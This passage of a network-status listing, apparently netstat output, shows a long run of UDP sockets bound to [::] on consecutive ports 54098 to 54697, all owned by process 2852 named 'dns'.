  UDP        [::]                                        54098         *:*                            2852              dns
  UDP        [::]                                        54099         *:*                            2852              dns
  UDP        [::]                                        54100         *:*                            2852              dns
  UDP        [::]                                        54101         *:*                            2852              dns
  UDP        [::]                                        54102         *:*                            2852              dns
  UDP        [::]                                        54103         *:*                            2852              dns
  UDP        [::]                                        54104         *:*                            2852              dns
  UDP        [::]                                        54105         *:*                            2852              dns
  UDP        [::]                                        54106         *:*                            2852              dns
  UDP        [::]                                        54107         *:*                            2852              dns
  UDP        [::]                                        54108         *:*                            2852              dns
  UDP        [::]                                        54109         *:*                            2852              dns
  UDP        [::]                                        54110         *:*                            2852              dns
  UDP        [::]                                        54111         *:*                            2852              dns
  UDP        [::]                                        54112         *:*                            2852              dns
  UDP        [::]                                        54113         *:*                            2852              dns
  UDP        [::]                                        54114         *:*                            2852              dns
  UDP        [::]                                        54115         *:*                            2852              dns
  UDP        [::]                                        54116         *:*                            2852              dns
  UDP        [::]                                        54117         *:*                            2852              dns
  UDP        [::]                                        54118         *:*                            2852              dns
  UDP        [::]                                        54119         *:*                            2852              dns
  UDP        [::]                                        54120         *:*                            2852              dns
  UDP        [::]                                        54121         *:*                            2852              dns
  UDP        [::]                                        54122         *:*                            2852              dns
  UDP        [::]                                        54123         *:*                            2852              dns
  UDP        [::]                                        54124         *:*                            2852              dns
  UDP        [::]                                        54125         *:*                            2852              dns
  UDP        [::]                                        54126         *:*                            2852              dns
  UDP        [::]                                        54127         *:*                            2852              dns
  UDP        [::]                                        54128         *:*                            2852              dns
  UDP        [::]                                        54129         *:*                            2852              dns
  UDP        [::]                                        54130         *:*                            2852              dns
  UDP        [::]                                        54131         *:*                            2852              dns
  UDP        [::]                                        54132         *:*                            2852              dns
  UDP        [::]                                        54133         *:*                            2852              dns
  UDP        [::]                                        54134         *:*                            2852              dns
  UDP        [::]                                        54135         *:*                            2852              dns
  UDP        [::]                                        54136         *:*                            2852              dns
  UDP        [::]                                        54137         *:*                            2852              dns
  UDP        [::]                                        54138         *:*                            2852              dns
  UDP        [::]                                        54139         *:*                            2852              dns
  UDP        [::]                                        54140         *:*                            2852              dns
  UDP        [::]                                        54141         *:*                            2852              dns
  UDP        [::]                                        54142         *:*                            2852              dns
  UDP        [::]                                        54143         *:*                            2852              dns
  UDP        [::]                                        54144         *:*                            2852              dns
  UDP        [::]                                        54145         *:*                            2852              dns
  UDP        [::]                                        54146         *:*                            2852              dns
  UDP        [::]                                        54147         *:*                            2852              dns
  UDP        [::]                                        54148         *:*                            2852              dns
  UDP        [::]                                        54149         *:*                            2852              dns
  UDP        [::]                                        54150         *:*                            2852              dns
  UDP        [::]                                        54151         *:*                            2852              dns
  UDP        [::]                                        54152         *:*                            2852              dns
  UDP        [::]                                        54153         *:*                            2852              dns
  UDP        [::]                                        54154         *:*                            2852              dns
  UDP        [::]                                        54155         *:*                            2852              dns
  UDP        [::]                                        54156         *:*                            2852              dns
  UDP        [::]                                        54157         *:*                            2852              dns
  UDP        [::]                                        54158         *:*                            2852              dns
  UDP        [::]                                        54159         *:*                            2852              dns
  UDP        [::]                                        54160         *:*                            2852              dns
  UDP        [::]                                        54161         *:*                            2852              dns
  UDP        [::]                                        54162         *:*                            2852              dns
  UDP        [::]                                        54163         *:*                            2852              dns
  UDP        [::]                                        54164         *:*                            2852              dns
  UDP        [::]                                        54165         *:*                            2852              dns
  UDP        [::]                                        54166         *:*                            2852              dns
  UDP        [::]                                        54167         *:*                            2852              dns
  UDP        [::]                                        54168         *:*                            2852              dns
  UDP        [::]                                        54169         *:*                            2852              dns
  UDP        [::]                                        54170         *:*                            2852              dns
  UDP        [::]                                        54171         *:*                            2852              dns
  UDP        [::]                                        54172         *:*                            2852              dns
  UDP        [::]                                        54173         *:*                            2852              dns
  UDP        [::]                                        54174         *:*                            2852              dns
  UDP        [::]                                        54175         *:*                            2852              dns
  UDP        [::]                                        54176         *:*                            2852              dns
  UDP        [::]                                        54177         *:*                            2852              dns
  UDP        [::]                                        54178         *:*                            2852              dns
  UDP        [::]                                        54179         *:*                            2852              dns
  UDP        [::]                                        54180         *:*                            2852              dns
  UDP        [::]                                        54181         *:*                            2852              dns
  UDP        [::]                                        54182         *:*                            2852              dns
  UDP        [::]                                        54183         *:*                            2852              dns
  UDP        [::]                                        54184         *:*                            2852              dns
  UDP        [::]                                        54185         *:*                            2852              dns
  UDP        [::]                                        54186         *:*                            2852              dns
  UDP        [::]                                        54187         *:*                            2852              dns
  UDP        [::]                                        54188         *:*                            2852              dns
  UDP        [::]                                        54189         *:*                            2852              dns
  UDP        [::]                                        54190         *:*                            2852              dns
  UDP        [::]                                        54191         *:*                            2852              dns
  UDP        [::]                                        54192         *:*                            2852              dns
  UDP        [::]                                        54193         *:*                            2852              dns
  UDP        [::]                                        54194         *:*                            2852              dns
  UDP        [::]                                        54195         *:*                            2852              dns
  UDP        [::]                                        54196         *:*                            2852              dns
  UDP        [::]                                        54197         *:*                            2852              dns
  UDP        [::]                                        54198         *:*                            2852              dns
  UDP        [::]                                        54199         *:*                            2852              dns
  UDP        [::]                                        54200         *:*                            2852              dns
  UDP        [::]                                        54201         *:*                            2852              dns
  UDP        [::]                                        54202         *:*                            2852              dns
  UDP        [::]                                        54203         *:*                            2852              dns
  UDP        [::]                                        54204         *:*                            2852              dns
  UDP        [::]                                        54205         *:*                            2852              dns
  UDP        [::]                                        54206         *:*                            2852              dns
  UDP        [::]                                        54207         *:*                            2852              dns
  UDP        [::]                                        54208         *:*                            2852              dns
  UDP        [::]                                        54209         *:*                            2852              dns
  UDP        [::]                                        54210         *:*                            2852              dns
  UDP        [::]                                        54211         *:*                            2852              dns
  UDP        [::]                                        54212         *:*                            2852              dns
  UDP        [::]                                        54213         *:*                            2852              dns
  UDP        [::]                                        54214         *:*                            2852              dns
  UDP        [::]                                        54215         *:*                            2852              dns
  UDP        [::]                                        54216         *:*                            2852              dns
  UDP        [::]                                        54217         *:*                            2852              dns
  UDP        [::]                                        54218         *:*                            2852              dns
  UDP        [::]                                        54219         *:*                            2852              dns
  UDP        [::]                                        54220         *:*                            2852              dns
  UDP        [::]                                        54221         *:*                            2852              dns
  UDP        [::]                                        54222         *:*                            2852              dns
  UDP        [::]                                        54223         *:*                            2852              dns
  UDP        [::]                                        54224         *:*                            2852              dns
  UDP        [::]                                        54225         *:*                            2852              dns
  UDP        [::]                                        54226         *:*                            2852              dns
  UDP        [::]                                        54227         *:*                            2852              dns
  UDP        [::]                                        54228         *:*                            2852              dns
  UDP        [::]                                        54229         *:*                            2852              dns
  UDP        [::]                                        54230         *:*                            2852              dns
  UDP        [::]                                        54231         *:*                            2852              dns
  UDP        [::]                                        54232         *:*                            2852              dns
  UDP        [::]                                        54233         *:*                            2852              dns
  UDP        [::]                                        54234         *:*                            2852              dns
  UDP        [::]                                        54235         *:*                            2852              dns
  UDP        [::]                                        54236         *:*                            2852              dns
  UDP        [::]                                        54237         *:*                            2852              dns
  UDP        [::]                                        54238         *:*                            2852              dns
  UDP        [::]                                        54239         *:*                            2852              dns
  UDP        [::]                                        54240         *:*                            2852              dns
  UDP        [::]                                        54241         *:*                            2852              dns
  UDP        [::]                                        54242         *:*                            2852              dns
  UDP        [::]                                        54243         *:*                            2852              dns
  UDP        [::]                                        54244         *:*                            2852              dns
  UDP        [::]                                        54245         *:*                            2852              dns
  UDP        [::]                                        54246         *:*                            2852              dns
  UDP        [::]                                        54247         *:*                            2852              dns
  UDP        [::]                                        54248         *:*                            2852              dns
  UDP        [::]                                        54249         *:*                            2852              dns
  UDP        [::]                                        54250         *:*                            2852              dns
  UDP        [::]                                        54251         *:*                            2852              dns
  UDP        [::]                                        54252         *:*                            2852              dns
  UDP        [::]                                        54253         *:*                            2852              dns
  UDP        [::]                                        54254         *:*                            2852              dns
  UDP        [::]                                        54255         *:*                            2852              dns
  UDP        [::]                                        54256         *:*                            2852              dns
  UDP        [::]                                        54257         *:*                            2852              dns
  UDP        [::]                                        54258         *:*                            2852              dns
  UDP        [::]                                        54259         *:*                            2852              dns
  UDP        [::]                                        54260         *:*                            2852              dns
  UDP        [::]                                        54261         *:*                            2852              dns
  UDP        [::]                                        54262         *:*                            2852              dns
  UDP        [::]                                        54263         *:*                            2852              dns
  UDP        [::]                                        54264         *:*                            2852              dns
  UDP        [::]                                        54265         *:*                            2852              dns
  UDP        [::]                                        54266         *:*                            2852              dns
  UDP        [::]                                        54267         *:*                            2852              dns
  UDP        [::]                                        54268         *:*                            2852              dns
  UDP        [::]                                        54269         *:*                            2852              dns
  UDP        [::]                                        54270         *:*                            2852              dns
  UDP        [::]                                        54271         *:*                            2852              dns
  UDP        [::]                                        54272         *:*                            2852              dns
  UDP        [::]                                        54273         *:*                            2852              dns
  UDP        [::]                                        54274         *:*                            2852              dns
  UDP        [::]                                        54275         *:*                            2852              dns
  UDP        [::]                                        54276         *:*                            2852              dns
  UDP        [::]                                        54277         *:*                            2852              dns
  UDP        [::]                                        54278         *:*                            2852              dns
  UDP        [::]                                        54279         *:*                            2852              dns
  UDP        [::]                                        54280         *:*                            2852              dns
  UDP        [::]                                        54281         *:*                            2852              dns
  UDP        [::]                                        54282         *:*                            2852              dns
  UDP        [::]                                        54283         *:*                            2852              dns
  UDP        [::]                                        54284         *:*                            2852              dns
  UDP        [::]                                        54285         *:*                            2852              dns
  UDP        [::]                                        54286         *:*                            2852              dns
  UDP        [::]                                        54287         *:*                            2852              dns
  UDP        [::]                                        54288         *:*                            2852              dns
  UDP        [::]                                        54289         *:*                            2852              dns
  UDP        [::]                                        54290         *:*                            2852              dns
  UDP        [::]                                        54291         *:*                            2852              dns
  UDP        [::]                                        54292         *:*                            2852              dns
  UDP        [::]                                        54293         *:*                            2852              dns
  UDP        [::]                                        54294         *:*                            2852              dns
  UDP        [::]                                        54295         *:*                            2852              dns
  UDP        [::]                                        54296         *:*                            2852              dns
  UDP        [::]                                        54297         *:*                            2852              dns
  UDP        [::]                                        54298         *:*                            2852              dns
  UDP        [::]                                        54299         *:*                            2852              dns
  UDP        [::]                                        54300         *:*                            2852              dns
  UDP        [::]                                        54301         *:*                            2852              dns
  UDP        [::]                                        54302         *:*                            2852              dns
  UDP        [::]                                        54303         *:*                            2852              dns
  UDP        [::]                                        54304         *:*                            2852              dns
  UDP        [::]                                        54305         *:*                            2852              dns
  UDP        [::]                                        54306         *:*                            2852              dns
  UDP        [::]                                        54307         *:*                            2852              dns
  UDP        [::]                                        54308         *:*                            2852              dns
  UDP        [::]                                        54309         *:*                            2852              dns
  UDP        [::]                                        54310         *:*                            2852              dns
  UDP        [::]                                        54311         *:*                            2852              dns
  UDP        [::]                                        54312         *:*                            2852              dns
  UDP        [::]                                        54313         *:*                            2852              dns
  UDP        [::]                                        54314         *:*                            2852              dns
  UDP        [::]                                        54315         *:*                            2852              dns
  UDP        [::]                                        54316         *:*                            2852              dns
  UDP        [::]                                        54317         *:*                            2852              dns
  UDP        [::]                                        54318         *:*                            2852              dns
  UDP        [::]                                        54319         *:*                            2852              dns
  UDP        [::]                                        54320         *:*                            2852              dns
  UDP        [::]                                        54321         *:*                            2852              dns
  UDP        [::]                                        54322         *:*                            2852              dns
  UDP        [::]                                        54323         *:*                            2852              dns
  UDP        [::]                                        54324         *:*                            2852              dns
  UDP        [::]                                        54325         *:*                            2852              dns
  UDP        [::]                                        54326         *:*                            2852              dns
  UDP        [::]                                        54327         *:*                            2852              dns
  UDP        [::]                                        54328         *:*                            2852              dns
  UDP        [::]                                        54329         *:*                            2852              dns
  UDP        [::]                                        54330         *:*                            2852              dns
  UDP        [::]                                        54331         *:*                            2852              dns
  UDP        [::]                                        54332         *:*                            2852              dns
  UDP        [::]                                        54333         *:*                            2852              dns
  UDP        [::]                                        54334         *:*                            2852              dns
  UDP        [::]                                        54335         *:*                            2852              dns
  UDP        [::]                                        54336         *:*                            2852              dns
  UDP        [::]                                        54337         *:*                            2852              dns
  UDP        [::]                                        54338         *:*                            2852              dns
  UDP        [::]                                        54339         *:*                            2852              dns
  UDP        [::]                                        54340         *:*                            2852              dns
  UDP        [::]                                        54341         *:*                            2852              dns
  UDP        [::]                                        54342         *:*                            2852              dns
  UDP        [::]                                        54343         *:*                            2852              dns
  UDP        [::]                                        54344         *:*                            2852              dns
  UDP        [::]                                        54345         *:*                            2852              dns
  UDP        [::]                                        54346         *:*                            2852              dns
  UDP        [::]                                        54347         *:*                            2852              dns
  UDP        [::]                                        54348         *:*                            2852              dns
  UDP        [::]                                        54349         *:*                            2852              dns
  UDP        [::]                                        54350         *:*                            2852              dns
  UDP        [::]                                        54351         *:*                            2852              dns
  UDP        [::]                                        54352         *:*                            2852              dns
  UDP        [::]                                        54353         *:*                            2852              dns
  UDP        [::]                                        54354         *:*                            2852              dns
  UDP        [::]                                        54355         *:*                            2852              dns
  UDP        [::]                                        54356         *:*                            2852              dns
  UDP        [::]                                        54357         *:*                            2852              dns
  UDP        [::]                                        54358         *:*                            2852              dns
  UDP        [::]                                        54359         *:*                            2852              dns
  UDP        [::]                                        54360         *:*                            2852              dns
  UDP        [::]                                        54361         *:*                            2852              dns
  UDP        [::]                                        54362         *:*                            2852              dns
  UDP        [::]                                        54363         *:*                            2852              dns
  UDP        [::]                                        54364         *:*                            2852              dns
  UDP        [::]                                        54365         *:*                            2852              dns
  UDP        [::]                                        54366         *:*                            2852              dns
  UDP        [::]                                        54367         *:*                            2852              dns
  UDP        [::]                                        54368         *:*                            2852              dns
  UDP        [::]                                        54369         *:*                            2852              dns
  UDP        [::]                                        54370         *:*                            2852              dns
  UDP        [::]                                        54371         *:*                            2852              dns
  UDP        [::]                                        54372         *:*                            2852              dns
  UDP        [::]                                        54373         *:*                            2852              dns
  UDP        [::]                                        54374         *:*                            2852              dns
  UDP        [::]                                        54375         *:*                            2852              dns
  UDP        [::]                                        54376         *:*                            2852              dns
  UDP        [::]                                        54377         *:*                            2852              dns
  UDP        [::]                                        54378         *:*                            2852              dns
  UDP        [::]                                        54379         *:*                            2852              dns
  UDP        [::]                                        54380         *:*                            2852              dns
  UDP        [::]                                        54381         *:*                            2852              dns
  UDP        [::]                                        54382         *:*                            2852              dns
  UDP        [::]                                        54383         *:*                            2852              dns
  UDP        [::]                                        54384         *:*                            2852              dns
  UDP        [::]                                        54385         *:*                            2852              dns
  UDP        [::]                                        54386         *:*                            2852              dns
  UDP        [::]                                        54387         *:*                            2852              dns
  UDP        [::]                                        54388         *:*                            2852              dns
  UDP        [::]                                        54389         *:*                            2852              dns
  UDP        [::]                                        54390         *:*                            2852              dns
  UDP        [::]                                        54391         *:*                            2852              dns
  UDP        [::]                                        54392         *:*                            2852              dns
  UDP        [::]                                        54393         *:*                            2852              dns
  UDP        [::]                                        54394         *:*                            2852              dns
  UDP        [::]                                        54395         *:*                            2852              dns
  UDP        [::]                                        54396         *:*                            2852              dns
  UDP        [::]                                        54397         *:*                            2852              dns
  UDP        [::]                                        54398         *:*                            2852              dns
  UDP        [::]                                        54399         *:*                            2852              dns
  UDP        [::]                                        54400         *:*                            2852              dns
  UDP        [::]                                        54401         *:*                            2852              dns
  UDP        [::]                                        54402         *:*                            2852              dns
  UDP        [::]                                        54403         *:*                            2852              dns
  UDP        [::]                                        54404         *:*                            2852              dns
  UDP        [::]                                        54405         *:*                            2852              dns
  UDP        [::]                                        54406         *:*                            2852              dns
  UDP        [::]                                        54407         *:*                            2852              dns
  UDP        [::]                                        54408         *:*                            2852              dns
  UDP        [::]                                        54409         *:*                            2852              dns
  UDP        [::]                                        54410         *:*                            2852              dns
  UDP        [::]                                        54411         *:*                            2852              dns
  UDP        [::]                                        54412         *:*                            2852              dns
  UDP        [::]                                        54413         *:*                            2852              dns
  UDP        [::]                                        54414         *:*                            2852              dns
  UDP        [::]                                        54415         *:*                            2852              dns
  UDP        [::]                                        54416         *:*                            2852              dns
  UDP        [::]                                        54417         *:*                            2852              dns
  UDP        [::]                                        54418         *:*                            2852              dns
  UDP        [::]                                        54419         *:*                            2852              dns
  UDP        [::]                                        54420         *:*                            2852              dns
  UDP        [::]                                        54421         *:*                            2852              dns
  UDP        [::]                                        54422         *:*                            2852              dns
  UDP        [::]                                        54423         *:*                            2852              dns
  UDP        [::]                                        54424         *:*                            2852              dns
  UDP        [::]                                        54425         *:*                            2852              dns
  UDP        [::]                                        54426         *:*                            2852              dns
  UDP        [::]                                        54427         *:*                            2852              dns
  UDP        [::]                                        54428         *:*                            2852              dns
  UDP        [::]                                        54429         *:*                            2852              dns
  UDP        [::]                                        54430         *:*                            2852              dns
  UDP        [::]                                        54431         *:*                            2852              dns
  UDP        [::]                                        54432         *:*                            2852              dns
  UDP        [::]                                        54433         *:*                            2852              dns
  UDP        [::]                                        54434         *:*                            2852              dns
  UDP        [::]                                        54435         *:*                            2852              dns
  UDP        [::]                                        54436         *:*                            2852              dns
  UDP        [::]                                        54437         *:*                            2852              dns
  UDP        [::]                                        54438         *:*                            2852              dns
  UDP        [::]                                        54439         *:*                            2852              dns
  UDP        [::]                                        54440         *:*                            2852              dns
  UDP        [::]                                        54441         *:*                            2852              dns
  UDP        [::]                                        54442         *:*                            2852              dns
  UDP        [::]                                        54443         *:*                            2852              dns
  UDP        [::]                                        54444         *:*                            2852              dns
  UDP        [::]                                        54445         *:*                            2852              dns
  UDP        [::]                                        54446         *:*                            2852              dns
  UDP        [::]                                        54447         *:*                            2852              dns
  UDP        [::]                                        54448         *:*                            2852              dns
  UDP        [::]                                        54449         *:*                            2852              dns
  UDP        [::]                                        54450         *:*                            2852              dns
  UDP        [::]                                        54451         *:*                            2852              dns
  UDP        [::]                                        54452         *:*                            2852              dns
  UDP        [::]                                        54453         *:*                            2852              dns
  UDP        [::]                                        54454         *:*                            2852              dns
  UDP        [::]                                        54455         *:*                            2852              dns
  UDP        [::]                                        54456         *:*                            2852              dns
  UDP        [::]                                        54457         *:*                            2852              dns
  UDP        [::]                                        54458         *:*                            2852              dns
  UDP        [::]                                        54459         *:*                            2852              dns
  UDP        [::]                                        54460         *:*                            2852              dns
  UDP        [::]                                        54461         *:*                            2852              dns
  UDP        [::]                                        54462         *:*                            2852              dns
  UDP        [::]                                        54463         *:*                            2852              dns
  UDP        [::]                                        54464         *:*                            2852              dns
  UDP        [::]                                        54465         *:*                            2852              dns
  UDP        [::]                                        54466         *:*                            2852              dns
  UDP        [::]                                        54467         *:*                            2852              dns
  UDP        [::]                                        54468         *:*                            2852              dns
  UDP        [::]                                        54469         *:*                            2852              dns
  UDP        [::]                                        54470         *:*                            2852              dns
  UDP        [::]                                        54471         *:*                            2852              dns
  UDP        [::]                                        54472         *:*                            2852              dns
  UDP        [::]                                        54473         *:*                            2852              dns
  UDP        [::]                                        54474         *:*                            2852              dns
  UDP        [::]                                        54475         *:*                            2852              dns
  UDP        [::]                                        54476         *:*                            2852              dns
  UDP        [::]                                        54477         *:*                            2852              dns
  UDP        [::]                                        54478         *:*                            2852              dns
  UDP        [::]                                        54479         *:*                            2852              dns
  UDP        [::]                                        54480         *:*                            2852              dns
  UDP        [::]                                        54481         *:*                            2852              dns
  UDP        [::]                                        54482         *:*                            2852              dns
  UDP        [::]                                        54483         *:*                            2852              dns
  UDP        [::]                                        54484         *:*                            2852              dns
  UDP        [::]                                        54485         *:*                            2852              dns
  UDP        [::]                                        54486         *:*                            2852              dns
  UDP        [::]                                        54487         *:*                            2852              dns
  UDP        [::]                                        54488         *:*                            2852              dns
  UDP        [::]                                        54489         *:*                            2852              dns
  UDP        [::]                                        54490         *:*                            2852              dns
  UDP        [::]                                        54491         *:*                            2852              dns
  UDP        [::]                                        54492         *:*                            2852              dns
  UDP        [::]                                        54493         *:*                            2852              dns
  UDP        [::]                                        54494         *:*                            2852              dns
  UDP        [::]                                        54495         *:*                            2852              dns
  UDP        [::]                                        54496         *:*                            2852              dns
  UDP        [::]                                        54497         *:*                            2852              dns
  UDP        [::]                                        54498         *:*                            2852              dns
  UDP        [::]                                        54499         *:*                            2852              dns
  UDP        [::]                                        54500         *:*                            2852              dns
  UDP        [::]                                        54501         *:*                            2852              dns
  UDP        [::]                                        54502         *:*                            2852              dns
  UDP        [::]                                        54503         *:*                            2852              dns
  UDP        [::]                                        54504         *:*                            2852              dns
  UDP        [::]                                        54505         *:*                            2852              dns
  UDP        [::]                                        54506         *:*                            2852              dns
  UDP        [::]                                        54507         *:*                            2852              dns
  UDP        [::]                                        54508         *:*                            2852              dns
  UDP        [::]                                        54509         *:*                            2852              dns
  UDP        [::]                                        54510         *:*                            2852              dns
  UDP        [::]                                        54511         *:*                            2852              dns
  UDP        [::]                                        54512         *:*                            2852              dns
  UDP        [::]                                        54513         *:*                            2852              dns
  UDP        [::]                                        54514         *:*                            2852              dns
  UDP        [::]                                        54515         *:*                            2852              dns
  UDP        [::]                                        54516         *:*                            2852              dns
  UDP        [::]                                        54517         *:*                            2852              dns
  UDP        [::]                                        54518         *:*                            2852              dns
  UDP        [::]                                        54519         *:*                            2852              dns
  UDP        [::]                                        54520         *:*                            2852              dns
  UDP        [::]                                        54521         *:*                            2852              dns
  UDP        [::]                                        54522         *:*                            2852              dns
  UDP        [::]                                        54523         *:*                            2852              dns
  UDP        [::]                                        54524         *:*                            2852              dns
  UDP        [::]                                        54525         *:*                            2852              dns
  UDP        [::]                                        54526         *:*                            2852              dns
  UDP        [::]                                        54527         *:*                            2852              dns
  UDP        [::]                                        54528         *:*                            2852              dns
  UDP        [::]                                        54529         *:*                            2852              dns
  UDP        [::]                                        54530         *:*                            2852              dns
  UDP        [::]                                        54531         *:*                            2852              dns
  UDP        [::]                                        54532         *:*                            2852              dns
  UDP        [::]                                        54533         *:*                            2852              dns
  UDP        [::]                                        54534         *:*                            2852              dns
  UDP        [::]                                        54535         *:*                            2852              dns
  UDP        [::]                                        54536         *:*                            2852              dns
  UDP        [::]                                        54537         *:*                            2852              dns
  UDP        [::]                                        54538         *:*                            2852              dns
  UDP        [::]                                        54539         *:*                            2852              dns
  UDP        [::]                                        54540         *:*                            2852              dns
  UDP        [::]                                        54541         *:*                            2852              dns
  UDP        [::]                                        54542         *:*                            2852              dns
  UDP        [::]                                        54543         *:*                            2852              dns
  UDP        [::]                                        54544         *:*                            2852              dns
  UDP        [::]                                        54545         *:*                            2852              dns
  UDP        [::]                                        54546         *:*                            2852              dns
  UDP        [::]                                        54547         *:*                            2852              dns
  UDP        [::]                                        54548         *:*                            2852              dns
  UDP        [::]                                        54549         *:*                            2852              dns
  UDP        [::]                                        54550         *:*                            2852              dns
  UDP        [::]                                        54551         *:*                            2852              dns
  UDP        [::]                                        54552         *:*                            2852              dns
  UDP        [::]                                        54553         *:*                            2852              dns
  UDP        [::]                                        54554         *:*                            2852              dns
  UDP        [::]                                        54555         *:*                            2852              dns
  UDP        [::]                                        54556         *:*                            2852              dns
  UDP        [::]                                        54557         *:*                            2852              dns
  UDP        [::]                                        54558         *:*                            2852              dns
  UDP        [::]                                        54559         *:*                            2852              dns
  UDP        [::]                                        54560         *:*                            2852              dns
  UDP        [::]                                        54561         *:*                            2852              dns
  UDP        [::]                                        54562         *:*                            2852              dns
  UDP        [::]                                        54563         *:*                            2852              dns
  UDP        [::]                                        54564         *:*                            2852              dns
  UDP        [::]                                        54565         *:*                            2852              dns
  UDP        [::]                                        54566         *:*                            2852              dns
  UDP        [::]                                        54567         *:*                            2852              dns
  UDP        [::]                                        54568         *:*                            2852              dns
  UDP        [::]                                        54569         *:*                            2852              dns
  UDP        [::]                                        54570         *:*                            2852              dns
  UDP        [::]                                        54571         *:*                            2852              dns
  UDP        [::]                                        54572         *:*                            2852              dns
  UDP        [::]                                        54573         *:*                            2852              dns
  UDP        [::]                                        54574         *:*                            2852              dns
  UDP        [::]                                        54575         *:*                            2852              dns
  UDP        [::]                                        54576         *:*                            2852              dns
  UDP        [::]                                        54577         *:*                            2852              dns
  UDP        [::]                                        54578         *:*                            2852              dns
  UDP        [::]                                        54579         *:*                            2852              dns
  UDP        [::]                                        54580         *:*                            2852              dns
  UDP        [::]                                        54581         *:*                            2852              dns
  UDP        [::]                                        54582         *:*                            2852              dns
  UDP        [::]                                        54583         *:*                            2852              dns
  UDP        [::]                                        54584         *:*                            2852              dns
  UDP        [::]                                        54585         *:*                            2852              dns
  UDP        [::]                                        54586         *:*                            2852              dns
  UDP        [::]                                        54587         *:*                            2852              dns
  UDP        [::]                                        54588         *:*                            2852              dns
  UDP        [::]                                        54589         *:*                            2852              dns
  UDP        [::]                                        54590         *:*                            2852              dns
  UDP        [::]                                        54591         *:*                            2852              dns
  UDP        [::]                                        54592         *:*                            2852              dns
  UDP        [::]                                        54593         *:*                            2852              dns
  UDP        [::]                                        54594         *:*                            2852              dns
  UDP        [::]                                        54595         *:*                            2852              dns
  UDP        [::]                                        54596         *:*                            2852              dns
  UDP        [::]                                        54597         *:*                            2852              dns
  UDP        [::]                                        54598         *:*                            2852              dns
  UDP        [::]                                        54599         *:*                            2852              dns
  UDP        [::]                                        54600         *:*                            2852              dns
  UDP        [::]                                        54601         *:*                            2852              dns
  UDP        [::]                                        54602         *:*                            2852              dns
  UDP        [::]                                        54603         *:*                            2852              dns
  UDP        [::]                                        54604         *:*                            2852              dns
  UDP        [::]                                        54605         *:*                            2852              dns
  UDP        [::]                                        54606         *:*                            2852              dns
  UDP        [::]                                        54607         *:*                            2852              dns
  UDP        [::]                                        54608         *:*                            2852              dns
  UDP        [::]                                        54609         *:*                            2852              dns
  UDP        [::]                                        54610         *:*                            2852              dns
  UDP        [::]                                        54611         *:*                            2852              dns
  UDP        [::]                                        54612         *:*                            2852              dns
  UDP        [::]                                        54613         *:*                            2852              dns
  UDP        [::]                                        54614         *:*                            2852              dns
  UDP        [::]                                        54615         *:*                            2852              dns
  UDP        [::]                                        54616         *:*                            2852              dns
  UDP        [::]                                        54617         *:*                            2852              dns
  UDP        [::]                                        54618         *:*                            2852              dns
  UDP        [::]                                        54619         *:*                            2852              dns
  UDP        [::]                                        54620         *:*                            2852              dns
  UDP        [::]                                        54621         *:*                            2852              dns
  UDP        [::]                                        54622         *:*                            2852              dns
  UDP        [::]                                        54623         *:*                            2852              dns
  UDP        [::]                                        54624         *:*                            2852              dns
  UDP        [::]                                        54625         *:*                            2852              dns
  UDP        [::]                                        54626         *:*                            2852              dns
  UDP        [::]                                        54627         *:*                            2852              dns
  UDP        [::]                                        54628         *:*                            2852              dns
  UDP        [::]                                        54629         *:*                            2852              dns
  UDP        [::]                                        54630         *:*                            2852              dns
  UDP        [::]                                        54631         *:*                            2852              dns
  UDP        [::]                                        54632         *:*                            2852              dns
  UDP        [::]                                        54633         *:*                            2852              dns
  UDP        [::]                                        54634         *:*                            2852              dns
  UDP        [::]                                        54635         *:*                            2852              dns
  UDP        [::]                                        54636         *:*                            2852              dns
  UDP        [::]                                        54637         *:*                            2852              dns
  UDP        [::]                                        54638         *:*                            2852              dns
  UDP        [::]                                        54639         *:*                            2852              dns
  UDP        [::]                                        54640         *:*                            2852              dns
  UDP        [::]                                        54641         *:*                            2852              dns
  UDP        [::]                                        54642         *:*                            2852              dns
  UDP        [::]                                        54643         *:*                            2852              dns
  UDP        [::]                                        54644         *:*                            2852              dns
  UDP        [::]                                        54645         *:*                            2852              dns
  UDP        [::]                                        54646         *:*                            2852              dns
  UDP        [::]                                        54647         *:*                            2852              dns
  UDP        [::]                                        54648         *:*                            2852              dns
  UDP        [::]                                        54649         *:*                            2852              dns
  UDP        [::]                                        54650         *:*                            2852              dns
  UDP        [::]                                        54651         *:*                            2852              dns
  UDP        [::]                                        54652         *:*                            2852              dns
  UDP        [::]                                        54653         *:*                            2852              dns
  UDP        [::]                                        54654         *:*                            2852              dns
  UDP        [::]                                        54655         *:*                            2852              dns
  UDP        [::]                                        54656         *:*                            2852              dns
  UDP        [::]                                        54657         *:*                            2852              dns
  UDP        [::]                                        54658         *:*                            2852              dns
  UDP        [::]                                        54659         *:*                            2852              dns
  UDP        [::]                                        54660         *:*                            2852              dns
  UDP        [::]                                        54661         *:*                            2852              dns
  UDP        [::]                                        54662         *:*                            2852              dns
  UDP        [::]                                        54663         *:*                            2852              dns
  UDP        [::]                                        54664         *:*                            2852              dns
  UDP        [::]                                        54665         *:*                            2852              dns
  UDP        [::]                                        54666         *:*                            2852              dns
  UDP        [::]                                        54667         *:*                            2852              dns
  UDP        [::]                                        54668         *:*                            2852              dns
  UDP        [::]                                        54669         *:*                            2852              dns
  UDP        [::]                                        54670         *:*                            2852              dns
  UDP        [::]                                        54671         *:*                            2852              dns
  UDP        [::]                                        54672         *:*                            2852              dns
  UDP        [::]                                        54673         *:*                            2852              dns
  UDP        [::]                                        54674         *:*                            2852              dns
  UDP        [::]                                        54675         *:*                            2852              dns
  UDP        [::]                                        54676         *:*                            2852              dns
  UDP        [::]                                        54677         *:*                            2852              dns
  UDP        [::]                                        54678         *:*                            2852              dns
  UDP        [::]                                        54679         *:*                            2852              dns
  UDP        [::]                                        54680         *:*                            2852              dns
  UDP        [::]                                        54681         *:*                            2852              dns
  UDP        [::]                                        54682         *:*                            2852              dns
  UDP        [::]                                        54683         *:*                            2852              dns
  UDP        [::]                                        54684         *:*                            2852              dns
  UDP        [::]                                        54685         *:*                            2852              dns
  UDP        [::]                                        54686         *:*                            2852              dns
  UDP        [::]                                        54687         *:*                            2852              dns
  UDP        [::]                                        54688         *:*                            2852              dns
  UDP        [::]                                        54689         *:*                            2852              dns
  UDP        [::]                                        54690         *:*                            2852              dns
  UDP        [::]                                        54691         *:*                            2852              dns
  UDP        [::]                                        54692         *:*                            2852              dns
  UDP        [::]                                        54693         *:*                            2852              dns
  UDP        [::]                                        54694         *:*                            2852              dns
  UDP        [::]                                        54695         *:*                            2852              dns
  UDP        [::]                                        54696         *:*                            2852              dns
  UDP        [::]                                        54697         *:*                            2852              dns
